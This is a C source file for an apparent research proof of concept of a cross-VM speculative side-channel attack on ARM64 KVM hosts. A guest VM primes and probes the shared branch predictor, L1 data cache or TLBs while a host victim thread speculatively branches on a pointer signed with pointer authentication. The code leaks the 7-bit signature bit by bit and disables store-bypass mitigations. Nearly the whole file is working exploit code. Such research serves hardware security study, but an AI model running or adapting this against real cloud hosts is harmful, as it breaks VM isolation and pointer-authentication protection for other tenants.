// xvm.c -- guest to host (VM to host). A KVM guest attacker and a host EL0 victim on one core. The L1D is
// physically tagged and shared, the BTB is shared, the TLBs are VMID-tagged. Needs /dev/kvm and guest.elf.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>
#include <time.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/prctl.h>
#include <linux/kvm.h>
#include "channel.h"

// guest VA layout, shared with guest.c
#define GVA          0x0000100000000000UL
#define PHASE_VA     (GVA + 0x0100000)
#define SLOT_VA      (GVA + 0x0200000)
#define TARGET_VA    (GVA + 0x2000000)
#define FUNCA_VA     (GVA + 0x2800000)
#define MK_VA        (GVA + 0x3000000)
#define MMIO_VA      (GVA + 0x4000000)
#define VECT_VA      (GVA + 0x5000000)
#define STRIDE_BYTES 4096
#define STRIDE 0x2000UL                         // 8 KB co-set stride: one BTB set
#define KENTRIES 40                             // guest eviction set: K co-set entries fill the shared set
#define VICTIM_VA(j) (TARGET_VA + (uint64_t)(KENTRIES + (j)) * STRIDE)
#define SECRET_P   0x0000007a00000000UL
#define SECRET_MASK (0x7fUL << 48)
#define ARENA_SZ   (64UL * 1024 * 1024)

// guest physical memory layout
#define GPA_RAM   0x40000000UL
#define RAM_SIZE  (128UL * 1024 * 1024)
#define GPA_L0    (GPA_RAM + 0x0000)
#define GPA_L1    (GPA_RAM + 0x1000)
#define GPA_L2    (GPA_RAM + 0x2000)
#define GPA_BLOCK (GPA_RAM + 0x200000)
#define MAP_MB    64
#define GPA_MMIO  0x80000000UL
#define GPA_VECT  (GPA_RAM + 0x6000000)

#define ARM64_CORE_REG(field) \
    (KVM_REG_ARM64 | KVM_REG_SIZE_U64 | KVM_REG_ARM_CORE | \
     (offsetof(struct kvm_regs, field) / sizeof(uint32_t)))
#define SR_SCTLR_EL1   ARM64_SYS_REG(3, 0, 1, 0, 0)
#define SR_TTBR0_EL1   ARM64_SYS_REG(3, 0, 2, 0, 0)
#define SR_TCR_EL1     ARM64_SYS_REG(3, 0, 2, 0, 2)
#define SR_MAIR_EL1    ARM64_SYS_REG(3, 0, 10, 2, 0)
#define SR_CNTKCTL_EL1 ARM64_SYS_REG(3, 0, 14, 1, 0)
#define SR_VBAR_EL1    ARM64_SYS_REG(3, 0, 12, 0, 0)

struct guest {
    int vmfd;
    int vcpufd;
    struct kvm_run *run;
    uint8_t *mem;
    uint64_t entry;
};

#define PHASE_PRIME 1
#define PHASE_PROBE 2
#define PHASE_FLUSH 3
#define PHASE_RELOAD 4
#define PHASE_PRIME_DTLB 5
#define PHASE_PROBE_DTLB 6
#define PHASE_PRIME_ITLB 7
#define PHASE_PROBE_ITLB 8
#define SHARE_VA (GVA + 0x1000000)
#define ITLB_VA  (GVA + 0x3800000)
#define TLB_PAGES 160

static int kvmfd = 0;
static int run_sz = 0;
static struct guest attacker_vm = { 0 };
static int g_victim_branches = 16;
static int g_control = 0;

static void set_vcpu_reg(int vcpu, uint64_t id, uint64_t value) {
    struct kvm_one_reg reg = { .id = id, .addr = (uint64_t)&value };
    if (ioctl(vcpu, KVM_SET_ONE_REG, &reg) < 0) {
        perror("SET_ONE_REG");
        exit(1);
    }
}
static uint64_t get_vcpu_reg(int vcpu, uint64_t id) {
    uint64_t value = 0;
    struct kvm_one_reg reg = { .id = id, .addr = (uint64_t)&value };
    if (ioctl(vcpu, KVM_GET_ONE_REG, &reg) < 0) {
        perror("GET_ONE_REG");
        exit(1);
    }
    return value;
}
static uint8_t *guest_to_host(struct guest *g, uint64_t va) {
    return g->mem + (GPA_BLOCK - GPA_RAM) + (va - GVA);
}
static void pin(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof set, &set);
}
static void on_alarm(int sig) {
    (void)sig;
}

// Indirect-branch stub for the guest prime entries and the host victim branches:
// x16 = (slot0 & slot1) ^ slot2; blr x16 at intra-stub offset +0x2C.
static void emit_stub(uint8_t *at, uint64_t slot) {
    uint32_t *words = (uint32_t *)at;
    words[0]  = 0xF81F0FFEu;
    words[1]  = 0xD2800011u | (uint32_t)((slot & 0xffff) << 5);
    words[2]  = 0xF2A00011u | (uint32_t)(((slot >> 16) & 0xffff) << 5);
    words[3]  = 0xF2C00011u | (uint32_t)(((slot >> 32) & 0xffff) << 5);
    words[4]  = 0xF9400230u;
    words[5]  = 0xF9400629u;
    words[6]  = 0x8A090210u;
    words[7]  = 0xF9400A29u;
    words[8]  = 0xCA090210u;
    words[9]  = 0xD503201Fu;
    words[10] = 0xD503201Fu;
    words[11] = 0xD63F0200u;                     // blr x16 (@ +0x2C): the speculative transmit
    words[12] = 0xF84107FEu;
    words[13] = 0xD65F03C0u;
}
// Victim stub: x16 = slot0 & slot1; blr x16. The host pre-signs slot0, so the victim only masks and branches.
static void emit_stub_victim(uint8_t *at, uint64_t slot) {
    uint32_t *words = (uint32_t *)at;
    words[0]  = 0xF81F0FFEu;
    words[1]  = 0xD2800011u | (uint32_t)((slot & 0xffff) << 5);
    words[2]  = 0xF2A00011u | (uint32_t)(((slot >> 16) & 0xffff) << 5);
    words[3]  = 0xF2C00011u | (uint32_t)(((slot >> 32) & 0xffff) << 5);
    words[4]  = 0xF9400230u;                                             // ldr x16, [x17]      (signed pointer)
    words[5]  = 0xF9400629u;                                             // ldr x9,  [x17, #8]  (and mask)
    words[6]  = 0x8A090210u;                                             // and x16, x16, x9
    words[7]  = 0xD503201Fu;                                             // nop
    words[8]  = 0xD503201Fu;                                             // nop
    words[9]  = 0xD503201Fu;                                             // nop
    words[10] = 0xD503201Fu;                                             // nop
    words[11] = 0xD63F0200u;                                             // blr x16 (@ +0x2C)
    words[12] = 0xF84107FEu;
    words[13] = 0xD65F03C0u;
}
static void emit_funcA(uint8_t *at, int k) {
    uint64_t mk = MK_VA + (uint64_t)k * STRIDE_BYTES;
    uint32_t *words = (uint32_t *)at;
    words[0] = 0xD2800009u | (uint32_t)((mk & 0xffff) << 5);
    words[1] = 0xF2A00009u | (uint32_t)(((mk >> 16) & 0xffff) << 5);
    words[2] = 0xF2C00009u | (uint32_t)(((mk >> 32) & 0xffff) << 5);
    words[3] = 0xF9400129u;
    words[4] = 0xD65F03C0u;
}
static void emit_vectors(struct guest *g) {
    uint32_t *vectors = (uint32_t *)(g->mem + (GPA_VECT - GPA_RAM));
    for (int entry = 0; entry < 16; ++entry) {
        vectors[entry * 32] = 0x14000000u;       // spin: a speculative flood never faults
    }
}
static void build_ptes(struct guest *g) {
    uint64_t *L0 = (uint64_t *)(g->mem + (GPA_L0 - GPA_RAM));
    uint64_t *L1 = (uint64_t *)(g->mem + (GPA_L1 - GPA_RAM));
    uint64_t *L2 = (uint64_t *)(g->mem + (GPA_L2 - GPA_RAM));
    memset(L0, 0, 4096);
    memset(L1, 0, 4096);
    memset(L2, 0, 4096);
    unsigned l0 = (GVA >> 39) & 0x1ff;
    unsigned l1 = (GVA >> 30) & 0x1ff;
    unsigned l2 = (GVA >> 21) & 0x1ff;
    L0[l0] = GPA_L1 | 0x3;
    L1[l1] = GPA_L2 | 0x3;
    for (int block_index = 0; block_index < MAP_MB / 2; ++block_index) {
        L2[l2 + block_index] = (GPA_BLOCK + (uint64_t)block_index * 0x200000) | 0x741;
    }
    L2[(MMIO_VA >> 21) & 0x1ff] = GPA_MMIO | (1UL << 54) | (1UL << 53) | 0x445;
    L2[(VECT_VA >> 21) & 0x1ff] = GPA_VECT | 0x701;
}
static void load_elf(struct guest *g, const char *path) {
    FILE *file = fopen(path, "rb");
    if (NULL == file) {
        perror("open guest.elf");
        exit(1);
    }
    static uint8_t buf[1 << 20] = { 0 };
    fread(buf, 1, sizeof buf, file);
    fclose(file);
    Elf64_Ehdr *elf_header = (Elf64_Ehdr *)buf;
    g->entry = elf_header->e_entry;
    Elf64_Phdr *prog_headers = (Elf64_Phdr *)(buf + elf_header->e_phoff);
    for (int ph_index = 0; ph_index < elf_header->e_phnum; ++ph_index) {
        if (PT_LOAD == prog_headers[ph_index].p_type) {
            memcpy(guest_to_host(g, prog_headers[ph_index].p_vaddr), buf + prog_headers[ph_index].p_offset,
                   prog_headers[ph_index].p_filesz);
        }
    }
}
static void build_guest_mem(struct guest *g) {
    for (int k = 0; k < KENTRIES; ++k) {
        emit_stub(guest_to_host(g, TARGET_VA + (uint64_t)k * STRIDE), SLOT_VA + (uint64_t)k * 32);
        emit_funcA(guest_to_host(g, FUNCA_VA + (uint64_t)k * 64), k);
        *(uint8_t *)guest_to_host(g, MK_VA + (uint64_t)k * STRIDE_BYTES) = 1;
    }
    for (int i = 0; i < TLB_PAGES; ++i) {
        *(uint32_t *)guest_to_host(g, ITLB_VA + (uint64_t)i * 4096) = 0xD65F03C0u;   // ret, for the iTLB flood
    }
}
static void vm_create(struct guest *g) {
    g->vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0);
    if (g->vmfd < 0) {
        perror("CREATE_VM");
        exit(1);
    }
    g->mem = mmap(NULL, RAM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == g->mem) {
        perror("mmap gmem");
        exit(1);
    }
    struct kvm_userspace_memory_region reg = {
        .slot = 0, .guest_phys_addr = GPA_RAM, .memory_size = RAM_SIZE, .userspace_addr = (uint64_t)g->mem
    };
    if (ioctl(g->vmfd, KVM_SET_USER_MEMORY_REGION, &reg) < 0) {
        perror("SET_MEM");
        exit(1);
    }
    g->vcpufd = ioctl(g->vmfd, KVM_CREATE_VCPU, 0);
    if (g->vcpufd < 0) {
        perror("CREATE_VCPU");
        exit(1);
    }
    struct kvm_vcpu_init init = { 0 };
    if (ioctl(g->vmfd, KVM_ARM_PREFERRED_TARGET, &init) < 0) {
        perror("PREF_TARGET");
        exit(1);
    }
    if (ioctl(g->vcpufd, KVM_ARM_VCPU_INIT, &init) < 0) {
        perror("VCPU_INIT");
        exit(1);
    }
    g->run = mmap(NULL, run_sz, PROT_READ | PROT_WRITE, MAP_SHARED, g->vcpufd, 0);
    if (MAP_FAILED == g->run) {
        perror("mmap run");
        exit(1);
    }
    build_ptes(g);
    load_elf(g, "guest.elf");
    build_guest_mem(g);
    emit_vectors(g);
    uint64_t sctlr = get_vcpu_reg(g->vcpufd, SR_SCTLR_EL1);
    set_vcpu_reg(g->vcpufd, SR_MAIR_EL1, 0x04FFUL);
    set_vcpu_reg(g->vcpufd, SR_TCR_EL1, 0x200000803510UL | (1UL << 37));   // TBI0=1: secret in [54:48]
    set_vcpu_reg(g->vcpufd, SR_TTBR0_EL1, GPA_L0);
    set_vcpu_reg(g->vcpufd, SR_VBAR_EL1, VECT_VA);
    set_vcpu_reg(g->vcpufd, SR_CNTKCTL_EL1, 0x3UL);
    uint64_t sctlr_value = (sctlr | (1UL << 0) | (1UL << 2) | (1UL << 12) | (1UL << 26) | (1UL << 23)) &
                 ~((1UL << 19) | (1UL << 20) | (1UL << 3) | (1UL << 4));
    set_vcpu_reg(g->vcpufd, SR_SCTLR_EL1, sctlr_value);
}
static uint64_t vm_phase(struct guest *g, uint32_t phase) {
    *(volatile uint32_t *)guest_to_host(g, PHASE_VA) = phase;
    set_vcpu_reg(g->vcpufd, ARM64_CORE_REG(regs.pc), g->entry);
    set_vcpu_reg(g->vcpufd, ARM64_CORE_REG(regs.pstate), 0x13c0);   // SSBS=1: store bypass not mitigated
    static int armed = 0;
    if (0 == armed) {
        struct sigaction sa = { 0 };
        sa.sa_handler = on_alarm;         // no SA_RESTART, so SIGALRM interrupts KVM_RUN with EINTR
        sigaction(SIGALRM, &sa, NULL);
        armed = 1;
    }
    alarm(3);
    int rc = ioctl(g->vcpufd, KVM_RUN, 0);
    alarm(0);
    if (rc < 0 && EINTR == errno) {
        fprintf(stderr, "guest wedged in phase %u\n", phase);
        exit(2);
    }
    if (rc < 0) {
        perror("KVM_RUN");
        exit(1);
    }
    if (KVM_EXIT_MMIO == g->run->exit_reason && GPA_MMIO == g->run->mmio.phys_addr) {
        return *(uint64_t *)g->run->mmio.data;
    }
    fprintf(stderr, "unexpected KVM exit %u\n", g->run->exit_reason);
    exit(1);
}

// victim in the host (host EL0): sign the pointer, keep it canonical only when the tested field bit is
// clear, and speculatively branch into the co-set site.
static uint8_t *host_arena = NULL;
static uint64_t host_slot[4] __attribute__((aligned(64))) = { 0 };
typedef void (*branch_fn_t)(void);
static long h_spec_flag[512] __attribute__((aligned(4096))) = { 0 };
static long h_spec_index[512] __attribute__((aligned(4096))) = { 0 };

static inline void flush_cacheline(void *line) { asm volatile("dc civac,%0" :: "r"(line) : "memory"); }
static inline void memory_barrier(void) { asm volatile("dsb sy\n isb\n" ::: "memory"); }
static inline void speculative_call(branch_fn_t branch_fn) {
    h_spec_flag[0] = 1;
    h_spec_index[0] = 0;
    flush_cacheline(&h_spec_index[0]);
    memory_barrier();
    long index = *(volatile long *)&h_spec_index[0];
    *(volatile long *)&h_spec_flag[index] = 0;
    if (g_control) {
        asm volatile("dsb sy\n isb\n" ::: "memory");
    }
    if (*(volatile long *)&h_spec_flag[0]) {
        branch_fn();
    }
}
static void host_build(void) {
    host_arena = mmap((void *)GVA, ARENA_SZ, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    if ((void *)GVA != host_arena) {
        perror("host arena fixed");
        exit(1);
    }
    for (int j = 0; j < g_victim_branches; ++j) {
        emit_stub_victim((uint8_t *)VICTIM_VA(j), (uint64_t)host_slot);
        __builtin___clear_cache((char *)VICTIM_VA(j), (char *)VICTIM_VA(j) + 56);
    }
}
static uint64_t host_sign(void) {
    uint64_t ptr = SECRET_P;
    asm volatile("pacia %0,%1" : "+r"(ptr) : "r"(0UL));
    return ptr;
}
static void host_single(uint64_t and_mask) {
    host_slot[0] = host_sign();
    host_slot[1] = and_mask;
    for (int j = 0; j < g_victim_branches; ++j) {
        speculative_call((branch_fn_t)VICTIM_VA(j));
    }
}

// Two-thread coordination: the attacker hands the victim branch and key reset to the victim thread, both
// pinned to one core.
static int g_core = 1;
static pthread_mutex_t coord_mtx = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t coord_cond = PTHREAD_COND_INITIALIZER;
static int g_req = 0;
static int g_prep = 0;
static int g_quit = 0;
static uint64_t g_and_mask = 0;
static unsigned g_vtruth = 0;

static void *victim_thread(void *arg) {
    (void)arg;
    pin(g_core);
    enable_store_bypass();
    for (;;) {
        pthread_mutex_lock(&coord_mtx);
        while (!g_req && !g_prep && !g_quit) {
            pthread_cond_wait(&coord_cond, &coord_mtx);
        }
        if (g_quit) {
            pthread_mutex_unlock(&coord_mtx);
            break;
        }
        if (g_prep) {
            prctl(PR_PAC_RESET_KEYS, PR_PAC_APIAKEY, 0, 0, 0);
            g_vtruth = (unsigned)((host_sign() >> 48) & 0x7f);
            g_prep = 0;
            pthread_cond_broadcast(&coord_cond);
            pthread_mutex_unlock(&coord_mtx);
            continue;
        }
        uint64_t and_mask = g_and_mask;
        pthread_mutex_unlock(&coord_mtx);
        host_single(and_mask);
        pthread_mutex_lock(&coord_mtx);
        g_req = 0;
        pthread_cond_broadcast(&coord_cond);
        pthread_mutex_unlock(&coord_mtx);
    }
    return NULL;
}
static void ask_victim(uint64_t and_mask) {
    pthread_mutex_lock(&coord_mtx);
    g_and_mask = and_mask;
    g_req = 1;
    pthread_cond_broadcast(&coord_cond);
    while (g_req) {
        pthread_cond_wait(&coord_cond, &coord_mtx);
    }
    pthread_mutex_unlock(&coord_mtx);
}
static void ask_victim_prep(void) {
    pthread_mutex_lock(&coord_mtx);
    g_prep = 1;
    pthread_cond_broadcast(&coord_cond);
    while (g_prep) {
        pthread_cond_wait(&coord_cond, &coord_mtx);
    }
    pthread_mutex_unlock(&coord_mtx);
}

// One shot: prime (guest), host branch, probe (guest). The probe returns the summed marker-line reload
// latency. A canonical victim branch evicts a primed entry and lifts it. The floor shot skips the victim.
static uint64_t shot(uint64_t and_mask) {
    vm_phase(&attacker_vm, PHASE_PRIME);
    ask_victim(and_mask);
    return vm_phase(&attacker_vm, PHASE_PROBE);
}
static uint64_t shot_floor(void) {
    vm_phase(&attacker_vm, PHASE_PRIME);
    return vm_phase(&attacker_vm, PHASE_PROBE);
}

// An all-zero field is canonical (accessed), the no-victim floor is never-evicted. Each bit keeps only its
// own field bit, so the secret bit decides whether the masked target stays canonical.
static int play_round(int samples) {
    int secret = 0;
    for (int bit = 0; bit < SECRET_BITS; ++bit) {
        uint64_t keep = ~SECRET_MASK | (1UL << (48 + bit));
        double delta_to_accessed = 0;
        double delta_to_floor = 0;
        for (int trial = 0; trial < samples; ++trial) {
            double accessed = (double)shot(~SECRET_MASK);
            double floor    = (double)shot_floor();
            double test     = (double)shot(keep);
            delta_to_accessed += test - accessed;
            delta_to_floor  += test - floor;
        }
        if ((delta_to_floor < 0 ? -delta_to_floor : delta_to_floor) < (delta_to_accessed < 0 ? -delta_to_accessed : delta_to_accessed)) {
            secret |= 1 << bit;
        }
    }
    return secret;
}

// Cross-VM over the shared cache: the guest flushes a shared line, the host victim touches it only when
// canonical, and the guest reloads it. The L1D is physically tagged, so a host fill is visible to the guest.
static gadget_fn l1d_gadget = NULL;
static struct slot l1d_slot;
static uint64_t l1d_base = 0;
static uint64_t l1d_signature = 0;
static enum pac_switch l1d_sw = SW_AUT;
static enum medium l1d_med = M_L1D;
static int l1d_mode = -1;
static int l1d_bit = 0;

static void *l1d_victim_thread(void *arg) {
    (void)arg;
    pin(g_core);
    enable_store_bypass();
    for (;;) {
        pthread_mutex_lock(&coord_mtx);
        while (!g_req && !g_prep && !g_quit) {
            pthread_cond_wait(&coord_cond, &coord_mtx);
        }
        if (g_quit) {
            pthread_mutex_unlock(&coord_mtx);
            break;
        }
        if (g_prep) {
            prctl(PR_PAC_RESET_KEYS, PR_PAC_APIAKEY, 0, 0, 0);
            l1d_signature = pac_sign(l1d_base, rand_u64());
            g_vtruth = (unsigned)((l1d_signature >> 48) & 0x7f);
            g_prep = 0;
            pthread_cond_broadcast(&coord_cond);
            pthread_mutex_unlock(&coord_mtx);
            continue;
        }
        int mode = l1d_mode;
        int bit = l1d_bit;
        pthread_mutex_unlock(&coord_mtx);
        if (0 > mode) {
            slot_secret(&l1d_slot, l1d_sw, l1d_signature, l1d_base, bit);
        } else {
            slot_profile(&l1d_slot, l1d_sw, l1d_base, bit, mode);
        }
        victim_transmit(l1d_gadget, &l1d_slot, g_control);
        pthread_mutex_lock(&coord_mtx);
        g_req = 0;
        pthread_cond_broadcast(&coord_cond);
        pthread_mutex_unlock(&coord_mtx);
    }
    return NULL;
}

static void ask_l1d_victim(int mode, int bit) {
    pthread_mutex_lock(&coord_mtx);
    l1d_mode = mode;
    l1d_bit = bit;
    g_req = 1;
    pthread_cond_broadcast(&coord_cond);
    while (g_req) {
        pthread_cond_wait(&coord_cond, &coord_mtx);
    }
    pthread_mutex_unlock(&coord_mtx);
}

// One shot against the shared medium: L1D flushes and reloads the shared line, dTLB and iTLB prime and probe
// the guest's own TLB.
static uint64_t shot_l1d(int mode, int bit) {
    uint32_t prime = PHASE_FLUSH;
    uint32_t probe = PHASE_RELOAD;
    if (M_DTLB == l1d_med) {
        prime = PHASE_PRIME_DTLB;
        probe = PHASE_PROBE_DTLB;
    } else if (M_ITLB == l1d_med) {
        prime = PHASE_PRIME_ITLB;
        probe = PHASE_PROBE_ITLB;
    }
    vm_phase(&attacker_vm, prime);
    ask_l1d_victim(mode, bit);
    return vm_phase(&attacker_vm, probe);
}

static int run_xvm_l1d(const struct cfg *cfg, struct chan_stats *out) {
    int rounds = cfg->rounds;
    int samples = cfg->samples;
    g_control = cfg->control;
    g_core = cfg->cpu;
    l1d_sw = cfg->sw;
    l1d_med = cfg->med;

    pin(cfg->cpu);
    enable_store_bypass();
    kvmfd = open("/dev/kvm", O_RDWR | O_CLOEXEC);
    if (kvmfd < 0) {
        perror("open /dev/kvm");
        return 1;
    }
    run_sz = ioctl(kvmfd, KVM_GET_VCPU_MMAP_SIZE, 0);
    vm_create(&attacker_vm);

    // The victim's base is the host mapping of the line the guest flushes and reloads.
    l1d_base = (uint64_t)guest_to_host(&attacker_vm, SHARE_VA);
    for (int line = 0; line < 16; ++line) {
        *(volatile uint8_t *)(l1d_base + (uint64_t)line * 64) = 1;
    }
    void *code = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == code) {
        perror("mmap gadget");
        return 1;
    }
    l1d_gadget = emit_gadget(code, cfg->sw, cfg->med);

    pthread_t victim_tid;
    if (0 != pthread_create(&victim_tid, NULL, l1d_victim_thread, NULL)) {
        perror("pthread_create");
        return 1;
    }

    struct chan_stats stats = { .rounds = rounds, .bits_total = (long)rounds * SECRET_BITS };
    struct timespec t0 = { 0 };
    struct timespec t1 = { 0 };
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int round = 0; round < rounds; ++round) {
        ask_victim_prep();
        unsigned recovered = 0;
        for (int bit = 0; bit < SECRET_BITS; ++bit) {
            double profile0 = 0;
            double profile1 = 0;
            double secret_sum = 0;
            for (int sample = 0; sample < samples; ++sample) {
                profile0 += (double)shot_l1d(0, bit);
                profile1 += (double)shot_l1d(1, bit);
                secret_sum += (double)shot_l1d(-1, bit);
            }
            recovered |= (unsigned)classify(secret_sum, profile0, profile1) << bit;
        }
        unsigned truth = g_vtruth;
        int hit = (recovered == truth);
        stats.full += hit;
        stats.bits_correct += bits_match(recovered, truth, SECRET_BITS);
        tee_printf("  %3d  | secret=0x%02x  recovered=0x%02x  %d/7  %s\n",
                   round, truth, recovered, bits_match(recovered, truth, SECRET_BITS), hit ? "WIN" : "lose");
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    stats.seconds = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;

    pthread_mutex_lock(&coord_mtx);
    g_quit = 1;
    pthread_cond_broadcast(&coord_cond);
    pthread_mutex_unlock(&coord_mtx);
    pthread_join(victim_tid, NULL);

    *out = stats;
    return 0;
}

int run_xvm(const struct cfg *cfg, struct chan_stats *out) {
    if (M_BTB != cfg->med) {
        return run_xvm_l1d(cfg, out);   // cache/TLB media over the shared line, Flush and Reload
    }
    int rounds = cfg->rounds;
    int samples = cfg->samples;
    g_control = cfg->control;
    g_core = cfg->cpu;

    pin(cfg->cpu);
    kvmfd = open("/dev/kvm", O_RDWR | O_CLOEXEC);
    if (kvmfd < 0) {
        perror("open /dev/kvm");
        return 1;
    }
    run_sz = ioctl(kvmfd, KVM_GET_VCPU_MMAP_SIZE, 0);
    vm_create(&attacker_vm);
    host_build();

    pthread_t victim_tid;
    if (0 != pthread_create(&victim_tid, NULL, victim_thread, NULL)) {
        perror("pthread_create");
        return 1;
    }

    struct chan_stats stats = { .rounds = rounds, .bits_total = (long)rounds * SECRET_BITS };
    struct timespec t0 = { 0 };
    struct timespec t1 = { 0 };
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int round = 0; round < rounds; ++round) {
        ask_victim_prep();
        int recovered = play_round(samples);
        unsigned truth = g_vtruth;
        int hit = (recovered == (int)truth);
        stats.full += hit;
        stats.bits_correct += bits_match((unsigned)recovered, truth, SECRET_BITS);
        tee_printf("  %3d  | secret=0x%02x  recovered=0x%02x  %d/7  %s\n",
                   round, truth, (unsigned)recovered, bits_match((unsigned)recovered, truth, SECRET_BITS),
                   hit ? "WIN" : "lose");
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    stats.seconds = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;

    pthread_mutex_lock(&coord_mtx);
    g_quit = 1;
    pthread_cond_broadcast(&coord_cond);
    pthread_mutex_unlock(&coord_mtx);
    pthread_join(victim_tid, NULL);

    *out = stats;
    return 0;
}
